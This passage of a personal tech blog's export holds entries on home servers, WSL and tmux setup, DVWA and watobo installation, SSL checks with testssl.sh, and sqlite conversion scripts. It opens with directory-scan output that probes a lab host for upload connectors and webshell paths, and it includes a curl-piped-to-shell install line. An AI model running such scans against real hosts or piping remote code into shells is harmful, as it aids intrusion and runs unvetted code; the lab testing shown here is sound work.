/admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx[14:38:15] 200 - 6KB - /admin/[14:38:15] 200 - 6KB - /admin/?/login[14:38:17] 200 - 386B - /asp.aspx[14:38:17] 301 - 163B - /aspnet_client -&gt; http://192.168.241.131:84/aspnet_client/[14:38:17] 200 - 394B - /aspxspy.aspx[14:38:19] 200 - 479B - /ckeditor/ckfinder/core/connector/aspx/connector.aspx[14:38:19] 200 - 392B - /cmdasp.aspx[14:38:19] 301 - 157B - /content -&gt; http://192.168.241.131:84/content/[14:38:20] 301 - 158B - /Download -&gt; http://192.168.241.131:84/Download/[14:38:20] 301 - 158B - /download -&gt; http://192.168.241.131:84/download/[14:38:21] 200 - 527B - /fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx[14:38:21] 200 - 493B - /fckeditor/editor/filemanager/connectors/aspx/connector.aspx[14:38:21] 200 - 487B - /fckeditor/editor/filemanager/connectors/aspx/upload.aspx[14:38:21] 200 - 479B - /fckeditor/editor/filemanager/upload/aspx/upload.aspx[14:38:21] 200 - 402B - /file_upload.aspx[14:38:22] 200 - 506B - /includes/fckeditor/editor/filemanager/connectors/aspx/upload.aspx[14:38:22] 200 - 512B - /includes/fckeditor/editor/filemanager/connectors/aspx/connector.aspx[14:38:22] 200 - 498B - /includes/fckeditor/editor/filemanager/upload/aspx/upload.aspx[14:38:22] 200 - 546B - /includes/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx[14:38:23] 200 - 10KB - /index.html[14:38:23] 200 - 394B - /install.aspx[14:38:23] 301 - 157B - /install -&gt; http://192.168.241.131:84/install/[14:38:23] 301 - 157B - /Install -&gt; http://192.168.241.131:84/Install/[14:38:23] 301 - 157B - /INSTALL -&gt; http://192.168.241.131:84/INSTALL/[14:38:23] 301 - 163B - /international -&gt; http://192.168.241.131:84/international/[14:38:23] 200 - 271B - /install/[14:38:23] 301 - 152B - /js -&gt; http://192.168.241.131:84/js/[14:38:24] 301 - 153B - /log -&gt; http://192.168.241.131:84/log/[14:38:27] 301 - 154B - /plus -&gt; http://192.168.241.131:84/plus/[14:38:28] 500 - 0B - /rating_over.[14:38:28] 301 - 157B - /release -&gt; http://192.168.241.131:84/release/[14:38:28] 200 - 496B - /scripts/ckeditor/ckfinder/core/connector/aspx/connector.aspx[14:38:29] 200 - 394B - /service.asmx[14:38:30] 200 - 386B - /spy.aspx[14:38:31] 301 - 158B - /template -&gt; http://192.168.241.131:84/template/[14:38:31] 200 - 388B - /test.aspx[14:38:31] 200 - 433B - /Trace.axd[14:38:31] 200 - 450B - /umbraco/webservices/codeEditorSave.asmx[14:38:32] 200 - 392B - /upload.aspx[14:38:32] 301 - 154B - /user -&gt; http://192.168.241.131:84/user/[14:38:32] 500 - 0B - /WEB-INF./web.xml[14:38:32] 200 - 367B - /WebResource.axd?d=LER8t9aS[14:38:40] 302 - 158B - /user/ -&gt; http://192.168.241.131:84/user/login.aspxTask Completed document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>Penetration</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[家庭服务器：NAS+HTPC+软路由]]></title>
    <url>%2F2019%2F08%2F29%2FHome_server%2F</url>
    <content type="text"><![CDATA[00 前言最近博客更新的内容少了，主要是最近太累了，又接近考试了，所以不能权衡两方面的工作 最近有了搭建私有云的想法，实现目的有其下几个： 离线下载（主要是百度云离线、下载） 家庭数据备份（如相片） 数据同步（私有云） （个人服务器） 0.1 HTPC + 离线下载主要是为了能够高清看美剧（1080P），国内没有1080P在线看网站（基本都是720P），国外高清源没有中英字幕 解决办法 ： 下载无字幕版，加字幕 (隐藏坑点 ： 投影到电视盒子的时候是否可以添加字幕？) 新增问题 : 如何搭建一个网站可以在移动端进行观看？新解决办法 ： kodi + emby 0.2 家庭数据备份我们会遇到这样的一个场景 ： 外出游玩时弄了很多相片，导致手机存储空间越来越小 主要是相片，应用场景为 ： 可以通过一个APP将相片上传到NAS，网络环境可以为内外网 01 基本设置基本定了，上X86处理器，win10系统 esxi底层 + Windows自带资源池 ZFS存储服务器 + 软路由 + HTPC + NAS 参考资料：总方向 ~ 配置ZFS存储服务器 ~ zfs过于麻烦，选用Windows自带资源池freenas与omnios+napp-it的速度对比 1.1 HTPC 设置使用kodi，很好用的播放器，暂定为Win10机上的HTPC播放器 参考资料1参考资料2 另外对于本地媒体库可参考链接 使用emby 官方链接 这东西真的是太棒了！！！ 1.2 HTPC 总结HTPC基本告一段落，win10机器同时启用kodi作为HTPC，使用emby作为网络流媒体播放器！ 字幕kodi可以自选，emby可以通过同样的命名可进行识别。 02 软路由软路由要求 ： 5G WiFi （取决于AP）和 无缝漫游 （DHCP的IP地址不变） 2.1 AP选择AC和AP是什么 需要终端和AP同时支持无缝漫游才行，这里推荐Ubnt 捷联讯通的AP方案，支持5G WiFi和无缝漫游 参考链接 2.2 软路由设置软路由lede入门阅读 首先，使用hyper-V虚拟机，下载LEDE的虚拟机vmdk镜像 这里原本是gz，通过一个工具转为vmdk，这个网站已经给了转好后的文件，参考即可（注意坑点） 然后安装它 安装链接2 软路由就告一段落了~ 坑点1 ： 注意下载的镜像是否与虚拟机设置一致为uefi或legacy 坑点2 ： 好像需要在外部虚拟交换机上更改IP才行，问题不大 最好的编译参考链接 完美设置链接完美设置链接2 分割线 参考资料1参考了解2 编译参考链接 03 硬盘测试使用Windows自带资源池，现在测试性能。 已在虚拟机上做完实验，镜像类资源池（raid1可以完美支持单盘损坏替换） raid0出了点问题，不过问题不大，所以不再测试。 推荐阅读 : 参考链接 04 黑裙辉老旧版本参考 黑裙辉的应该有挺多教程的，先暂置吧，看啥时候有空就直接上手了 先弄到这里吧，以后上真机了再慢慢操作 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Home</category>
      </categories>
      <tags>
        <tag>NAS</tag>
        <tag>HTPC</tag>
        <tag>RouterOS</tag>
        <tag>Home</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2019%2F08%2F29%2Fregular_expression%2F</url>
    <content type="text"><![CDATA[00 前言正则表达式查询表 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WSL设置]]></title>
    <url>%2F2019%2F08%2F29%2Fwsl_configuration%2F</url>
    <content type="text"><![CDATA[00前言—更新—辣鸡wsl, 各种不兼容, 返回vm怀抱 vm笔记本发热有点严重, 投入wsl怀抱 vim粘贴乱码解决 :set paste 01 ssh1apt-get install openssh-server vim etc/ssh/sshd_config : 123PermitRootLogin yesPort 2222ListenAddress 127.0.0.1 这里不能开机自启, 手动吧 02 tmux首先设置PS1 1PS1=' \n\[\033[37m\][\[\033[m\]\[\033[1;36m\]\t\[\033[m\] - \e[1;32m\]\u\[\e[m\]\[\e[1;33m\]@\[\e[m\]\[\e[35m\]\H\[\e[m\] \[\e[4;37m\]`pwd`\[\e[m\]\[\033[37m\]]\[\033[m\]\n\[\e[36m\]\$ =&gt; \[\e[m\] ' 可以使用以下方法 1234cd ~git clone https://github.com/****/.tmux.gitln -s -f .tmux/.tmux.confcp .tmux/.tmux.conf.local . 优化 vim .tmux.conf 12unbind %bind | splitw -h -c '#{pane_current_path}' # 水平方向新增面板，默认进入当前目录 或者自定义: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# Use something easier to type as the prefix.set -g prefix C-aunbind C-bbind C-a send-prefix# 窗口计数从1开始，方便切换set -g base-index 1setw -g pane-base-index 1# 启用和关闭status barbind S set status onbind D set status off# 消息背景色# set -g message-bg whiteset -g mode-keys vi# 关闭自动重命名窗口setw -g allow-rename offsetw -g automatic-rename off# bind a reload keybind r source-file ~/.tmux.conf \; display-message "Config reloaded..."# I personally rebind the keys so "|" splits the current window vertically, and "-" splits it horizontally. Not the easiest things to type, though easy to remember.bind | split-window -hbind _ split-window -v# fixes the delay problemset -sg escape-time 0# 面板切换bind-key k select-pane -Ubind-key j select-pane -Dbind-key h select-pane -Lbind-key l select-pane -R# 面板大小调整bind -r ^k resizep -U 10bind -r ^j resizep -D 10bind -r ^h resizep -L 10bind -r ^l resizep -R 10# 状态栏# 颜色set -g status-bg blackset -g status-fg white# 对齐方式set-option -g status-justify centre# 左下角set-option -g status-left '#[bg=black,fg=green][#[fg=cyan]#S#[fg=green]]'set-option -g status-left-length 20# 窗口列表set-window-option -g window-status-format '#[dim]#I:#[default]#W#[fg=grey,dim]'set-window-option -g window-status-current-format '#[fg=cyan,bold]#I#[fg=blue]:#[fg=cyan]#W#[fg=dim]'# 右下角set -g status-right '#[fg=green][#[fg=cyan]%H:%M#[fg=green]]'# 开启鼠标set-option -g mouse on# 面板unbind '"'bind - splitw -v -c '#{pane_current_path}' # 垂直方向新增面板，默认进入当前目录unbind %bind | splitw -h -c '#{pane_current_path}' # 水平方向新增面板，默认进入当前目录 03 优化关闭cmd的声音 04 备份/还原参考 05 代理apt-get install proxychains vim /etc/proxychains.conf 123dynamic_chainsocks5 127.0.0.1 10808http 127.0.0.1 10888 vim .bashrc 12345complete -c proxychainsalias setproxysocks5='export ALL_PROXY=socks5h://127.0.0.1:10808'alias unsetproxy='unset ALL_PROXY'alias setproxyhttp='export ALL_PROXY=http://127.0.0.1:10888' 05 辣鸡zsh/fish永别, 不兼容tmux, 字符换显示错误, 各种辣鸡, 永别 06 自动补齐增强包apt-get install bash-completion 07 其他安装包不再赘述 08 文件传输c, d, e盘都在/mnt 的目录下 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>Windows</category>
        <category>WSL</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[watobo安装使用]]></title>
    <url>%2F2019%2F08%2F29%2Fwatobo_installation%2F</url>
    <content type="text"><![CDATA[00 前言WATOBO是一款Web应用程序安全测试工具。 1.安装watobo1.在kali安装：install watobo```122.卸载：```apt-get remove watobo 2.安装DVWA(Dam Vulnerable Web Application)1.github下载release包 2.解压到/var/www/html路径下 解压–xvf加上-z为解压gz，加上-j为解压bz2 3.将apache2停止：service apache2 stop 4.给dvwa文件夹相应的权限：chmod -R 755 /var/www/html/dvwa chmod文件及子文件夹加入参数 -R 5.启动mysql服务： service mysql start 6.打开mysql： mysql -u root -p 7.创建数据库：create database dvwa; 这里比较坑的是，网上的大部分DVWA安装教程基于旧版的MySQL，现在的是基于mariadb 8.创建新的用户并附加权限：grant all on dvwa.* to dvwa@localhost identified by '123456'; 9.权限更新：flush privileges; 10.退出mysql：exit 11.更改config文件 找到/var/www/html/dvwa/config文件夹，打开其中的config.inc.php.list文件，更改名字为config.inc.php 将$DVWA[ ‘db_password’ ] = ‘_p@ssw0rd‘; 这一行改为$DVWA[ ‘db_password’ ] = ‘_123456‘; 将$DVWA[ ‘db_user’ ] = ‘_root‘; 这一行改为$DVWA[ ‘db_user’ ] = ‘_dvwa‘; 12.启动apache2服务：service apache2 start 13.访问127.0.0.1/dvwa即可,默认用户名为admin，密码为password 重启后，输入第5和第12的命令启动apache和mysql即可 git配置socks5代理 git config --global http.proxy 'socks5://127.0.0.1:1080' git config --global https.proxy 'socks5://127.0.0.1:1080' 3.进行测试​ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>watobo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmux+fish调优终端]]></title>
    <url>%2F2019%2F08%2F29%2Ftmux_and_fish%2F</url>
    <content type="text"><![CDATA[00 前言最近老是需要重新配置环境, 所以把tmux + fish + 代理的所有配置一起贴出来, 以前的文章就懒得再删除整理了. 01 tmux安装可以使用aptitude show tmux 或者 tmux -V查看tmux 的版本版本需要大于2.1CnetOS最新版Ubuntu最新版 02 tmux设置首先设置PS1 1PS1=' \n\[\033[37m\][\[\033[m\]\[\033[1;36m\]\t\[\033[m\] - \e[1;32m\]\u\[\e[m\]\[\e[1;33m\]@\[\e[m\]\[\e[35m\]\H\[\e[m\] \[\e[4;37m\]`pwd`\[\e[m\]\[\033[37m\]]\[\033[m\]\n\[\e[36m\]\$ =&gt; \[\e[m\] ' 可以使用以下方法 1234cd ~git clone https://github.com/****/.tmux.gitln -s -f .tmux/.tmux.confcp .tmux/.tmux.conf.local . 优化 vim .tmux.conf 12unbind %bind | splitw -h -c '#{pane_current_path}' # 水平方向新增面板，默认进入当前目录 或者自定义: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# Use something easier to type as the prefix.set -g prefix C-aunbind C-bbind C-a send-prefix# 窗口计数从1开始，方便切换set -g base-index 1setw -g pane-base-index 1# 启用和关闭status barbind S set status onbind D set status off# 消息背景色# set -g message-bg whiteset -g mode-keys vi# 关闭自动重命名窗口setw -g allow-rename offsetw -g automatic-rename off# bind a reload keybind r source-file ~/.tmux.conf \; display-message "Config reloaded..."# I personally rebind the keys so "|" splits the current window vertically, and "-" splits it horizontally. Not the easiest things to type, though easy to remember.bind | split-window -hbind _ split-window -v# fixes the delay problemset -sg escape-time 0# 面板切换bind-key k select-pane -Ubind-key j select-pane -Dbind-key h select-pane -Lbind-key l select-pane -R# 面板大小调整bind -r ^k resizep -U 10bind -r ^j resizep -D 10bind -r ^h resizep -L 10bind -r ^l resizep -R 10# 状态栏# 颜色set -g status-bg blackset -g status-fg white# 对齐方式set-option -g status-justify centre# 左下角set-option -g status-left '#[bg=black,fg=green][#[fg=cyan]#S#[fg=green]]'set-option -g status-left-length 20# 窗口列表set-window-option -g window-status-format '#[dim]#I:#[default]#W#[fg=grey,dim]'set-window-option -g window-status-current-format '#[fg=cyan,bold]#I#[fg=blue]:#[fg=cyan]#W#[fg=dim]'# 右下角set -g status-right '#[fg=green][#[fg=cyan]%H:%M#[fg=green]]'# 开启鼠标set-option -g mouse on 重启tmux即可 03 fish安装fish安装过分辣鸡, 弃用 1. 安装fish，安装oh-my-fish [参考链接](&lt;https://linux.cn/article-9515-1.html&gt;) [fish最新版安装参考网页](&lt;http://fishshell.com/#platform_tabs&gt;) 12345sudo apt-add-repository ppa:fish-shell/release-3sudo apt-get updatesudo apt-get install fishcurl -L github.com/oh-my-fish/oh-my-fish/raw/master/bin/install | fish 2. 安装主题：theme-bobthefish [主题参考链接](&lt;https://www.helplib.com/GitHub/article_124955&gt;) `omf install bobthefish` 3. 进行一些设置 1234set -U theme_nerd_fonts yesset -U theme_color_scheme terminal-dark-white# Ubuntu 选择 set -U theme_color_scheme zenburn set -U fish_prompt_pwd_dir_length 004 proxychians 设置vim /etc/proxychains.conf 12socks5 127.0.0.1 10808http 127.0.0.1 10888 加入代理vim .bashrc 12345678910complete -c proxychainsalias setproxysocks5='export ALL_PROXY=socks5h://127.0.0.1:10808'alias unsetproxy='unset ALL_PROXY'alias setproxyhttp='export ALL_PROXY=http://127.0.0.1:10888' ##v2ray和curl会有socks5的冲突,从网上找到的参考链接里可以发现，我们加上socks5h就可以了PS1=' \n\[\033[37m\][\[\033[m\]\[\033[1;36m\]\t\[\033[m\] - \e[1;32m\]\u\[\e[m\]\[\e[1;33m\]@\[\e[m\]\[\e[35m\]\H\[\e[m\] \[\e[4;37m\]`pwd`\[\e[m\]\[\033[37m\]]\[\033[m\]\n\[\e[36m\]\$ =&gt; \[\e[m\] 'source .bashrc 官方源123#官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>tmux</tag>
        <tag>fish</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSL类安全问题验证]]></title>
    <url>%2F2019%2F08%2F29%2Fssl_security_problem_slove%2F</url>
    <content type="text"><![CDATA[00 前言 00. 前言最近博客更新有点少，比较忙，今天抽空把SSL类证书的安全问题都理一遍 预备知识：Linux基础操作，bash相关 —-坑点1—–不要从Windows上下载工具再移到Linux中 Windows的保存文本方式换行为\r，从Windows下载的sh脚本会自动加上\r导致出错 01. 总要概述一条命令即可： ./testssl.sh -4 -O -p &lt;Domain or IP&gt; SSL 2.0不推荐使用的协议会显示 SSLv2 offered (NOT ok), also VULNERABLE to DROWN attack -- 2 ciphers 检测到RC4密码套件 RC4 (CVE-2013-2566, CVE-2015-2808) VULNERABLE (NOT ok): RC4-SHA RC4-MD5 RC4-MD5 狮子狗攻击（支持SSLv3） POODLE, SSL (CVE-2014-3566) VULNERABLE (NOT ok), uses SSLv3+CBC (check TLS_FALLBACK_SCSV mitigation below) 小于2048位的SSL证书公钥使用参数 --wide 或者直接在浏览器查看证书位数 02. 详细情况testssl 官方GitHub下载地址点击这里 官方使用参考链接点击这里 参数详解参考官方使用手册 -4 为RC4密码套件 -O 为POODLE （狮子狗攻击） -p 为检查TLS / SSL协议（包括SPDY / HTTP2） 03. 总结这工具不错，后续有其他需求再继续补充 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Penetration</category>
        <category>SSL</category>
      </categories>
      <tags>
        <tag>SSL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql数据库学习]]></title>
    <url>%2F2019%2F08%2F29%2Fsql_db_learning%2F</url>
    <content type="text"><![CDATA[00 前言今天任务：数据库文件gbk转utf-8码 01. 工具：Navicatnavicat官方教程 Navicat其他非官方教程 02. 操作步骤网上找了找，确实没有很好的工具进行直接转换。 只能手工操作了，思路如下： 把数据从数据库导出来 再把数据导进去就可以了 操作是不是很简单？屁了，慢慢操作吧 03. 导出数据现在要对数据库进行导出，首先要干的肯定是先备份数据 导出数据有两种操作，一种是用命令行，一种是用python 这里我们选择用python 哦吼，搞不定，放弃。先弄sql命令吧 哦吼，又搞不定，放弃，弄回python脚本，毕竟有现成的成功读取的脚本 用上之前写好的脚本，报错，报错。 算了，自己重新写一份吧python读取sqlite参考链接 淦，改了改总算好了 我们把之前的脚本进行改了改，就可以实现读取功能了: 12345678910111213141516#!/usr/bin/env python3# -*- coding:utf-8 -*-import sqlite3,#导入模块vulnDB = 'vuln.db'conn = sqlite3.connect(vulnDB)#读取文件conn.text_factory = lambda x: str(x, 'gbk', 'ignore')#对读取的sqlite进行gbk处理res = conn.execute( r"""select * from VULNDB""").fetchone()print(res[3]) 04. 写入数据 把数据导出来之后就要进行utf-8写入了 现在尝试进行尝试写入数据后，会报错，找了一下资料，找到了解决办法写入参考链接 最终代码如下： 123456789101112131415161718192021222324252627#!/usr/bin/env python3# -*- coding:utf-8 -*-import sqlite3,os#导入模块# os.system('CHCP 65001')vulnDB = 'vuln.db'conn = sqlite3.connect(vulnDB)#读取文件conn.text_factory = lambda x: str(x, 'gbk', 'ignore')#不太清楚是啥。加进去先# 这里应该是对数据库进行转码res = conn.execute( r"""select * from VULNDB""").fetchone()# # print(type(res.fetchone()))# pluginID, vulname, _, vul_desc, vul_solu = resprint(res)sql = r"""insert into VULNDB1 (Plugin_ID,NAME,Risk,Description,Solution) values(?,?,?,?,?)"""para = resconn.execute(sql,para)conn.commit() 05. 批量读取写入接下来就是如何把这个数据库逐步读取，然后写入了 刚开始的思路是for进行迭代读取，然后发现有问题 找资料，无果 不说了，问大佬去，得到结果如下： 123451. fetchall出来的结果可迭代的2. for i in conn.execute(sql).fetchall(): conn.execute(update_sql) 当然，这样写可能导致异常 进行尝试，除了点小错误就是for i in conn.execute(sql).fetchall这里忘了加上括号，导致报错说不可迭代。大佬一语中的的指出了问题，这就是大佬啊 最后代码如下： 123456789101112131415161718192021222324252627#!/usr/bin/env python3# -*- coding:utf-8 -*-import sqlite3,os#导入模块# os.system('CHCP 65001')vulnDB = 'vuln.db'conn = sqlite3.connect(vulnDB)#读取文件conn.text_factory = lambda x: str(x, 'gbk', 'ignore')#不太清楚是啥。加进去先sqlread = r"""select * from VULNDB"""sqlwrite = r"""insert into VULNDB1 (Plugin_ID,NAME,Risk,Description,Solution) values(?,?,?,?,?)"""for i in conn.execute(sqlread).fetchall(): print(i) para = i conn.execute(sqlwrite,para)conn.commit() 还有个小知识点就是commit()函数不要写在循环里面，占用资源 06. 总结总的来说就是不断排坑的过程，但是思路要清晰，然后找找资料，遇到了关卡先思考一下，实在不行就去麻烦大佬 XD (笑) GitHub代码地址 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Database</category>
        <category>Python</category>
        <category>sql</category>
        <category>db</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mongo搭建]]></title>
    <url>%2F2019%2F08%2F29%2Fmongo_installation%2F</url>
    <content type="text"><![CDATA[00 前言某天遇到了某项事件：mongoDB未授权访问查看数据也就是搭建一个mongoDB管理器 01 准备使用工具：phpmyAdmin 和 rockmongo 02 进行设置参考链接 分为以下几点： 切换PHP版本 下载dll文件 并替换到PHPTutorial\php\php-5.6.27-nts\ext这个目录下 重启服务, 搜索http://localhost/phpinfo.php 看有没有mongo拓展 03 总结按照步骤来就行, 没啥问题mongo使用方法 最终成果: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Database</category>
        <category>Mongo</category>
      </categories>
      <tags>
        <tag>Mongo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[excel导入数据库]]></title>
    <url>%2F2019%2F08%2F29%2Fexcel_import_to_db%2F</url>
    <content type="text"><![CDATA[00 前言今日任务：查找出excel表中的Plugin_ID,然后进行导入数据库 所用工具：sqlite stdio 01 查找Plugin_ID人工太慢了，学好python的重要性又多了一步。人生苦短，我学python 首先我参考excel表中的vlookup函数，vlookup()参考资料 坑点来了：vlookup()不支持255个字符以上的查询。。office官方参考链接 找了找资料，换成了loopup()函数，还是不行，网上找了找资料，发现这样是可以的 =LOOKUP(1,0/(J1:J10=值),N1:N10) 前一个J列为匹配的列，这里为description，N列为匹配显示的列，这里为plugin_ID 经过处理后，需 另存为csv文件 最终结果如下 02 导入数据库通过excel导入数据库 用sqlite工具即可，这里选择sqlite studio和navicat premium为例 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Office</category>
        <category>Database</category>
        <category>excel</category>
        <category>excel</category>
      </categories>
      <tags>
        <tag>excel</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux后台终端命令]]></title>
    <url>%2F2019%2F08%2F29%2Flinux_backstage_command%2F</url>
    <content type="text"><![CDATA[00 前言今天介绍一下Linux下的命令，screen，nohup，tmux都有一些共同点，终端复用，具体就去网上查吧。这里介绍一下用法 01 screen的用法​ 参考资料 创建screen会话 ​ screen -S NAME / screen COMMAND(执行完成后退出) 看看有哪些会话 screen -ls 切换到用 screen -r (这里写上pid或者名字，例如screen -r lnmp，从-ls上找到的) 从session里切回到主terminal Ctrl+a+d 从session里杀掉此session Ctrl+a+k，也可以用exit 如果有一些杀掉的session(窗口)dead掉的时候，清除用screen -wipe，也可以用kill命令 screen状态为Attached的时候连上不，用screen -D -r ＜session-id&gt;，-D -r 先踢掉前一用户，再登陆 还有待补充 02 tmux用法参考链接 预备知识： 总session，分windows，再分pane 和screen类似，这个也有快捷键Ctrl+b Session操作 创建session tmux / tmux new -s NAME 重命名session： Ctrl+b $ 查看session 快捷键Ctrl+b s 或者tmux ls 退出session到terminal tmux detach 快捷键Ctrl+b+d 进入会话tmux a -t session_name / tmux a 默认进入第一个session 关闭server, session, window, pane kill命令有kill-pane、kill-server、kill-session 和 kill-window 1234tmux kill-server # 关闭服务器，所有的会话都将关闭tmux kill-session -t demo # 关闭demo会话tmux kill-windowtmux kill-pane 修改快捷键 首先更改快捷指令Ctrl+b 为 Ctrl+a ，和screen的一样来 首先新建一个文件~/.tmux.conf,有的话就直接vim修改 更改好以后可以直接restart tmux或者在tmux里Ctrl+b : 输入 source-file ~/.tmux.conf 即可生效 这里我直接采用https://github.com/gpakosz/.tmux这个配置，挺好用的，真棒 这个配置有很多特色，吸引我的是两个，一个是外观，一个是可以直接配合fish进行完全美化。 特色包括了：鼠标支持Ctrl+a m，支持窗口拖拽等，非常好用 window 操作 新建window为Ctrl+a c， 关闭为Ctrl+a &amp;， 切换为Ctrl+a p/n， 之后就是重命名了Ctrl+a ,， 修改当前窗口编号（适用于窗口重新排序）为Ctrl+a . 切换window直接Ctrl+a 0~9 pane 操作 关闭pane为 Ctrl+a x,或者上面的tmux kill-pane 切换可用鼠标或者Ctrl+a h,j,k,l 新建pane为 Ctrl+a - 和 Ctrl+a | 最大化当前面板，再重复一次按键后恢复正常 Ctrl+b z 显示面板编号，在编号消失前输入对应的数字可切换到相应的面板 Ctrl+b q 最后是复制粘贴到本地，gpakosz这个有鼠标支持 12345678910前提：开启了鼠标支持# 启用鼠标(Tmux v2.1)# set -g mouse on打开鼠标支持`Ctrl+a m`按住 shift，鼠标左键选择文本，选择“复制”，shift+insert。#注意全程按住 shift。 03 有趣的地方来了写一个新的blog记录这有趣的事情 涉及到终端美化方面 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>command</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些Linux命令]]></title>
    <url>%2F2019%2F08%2F29%2Fsome_linux_command%2F</url>
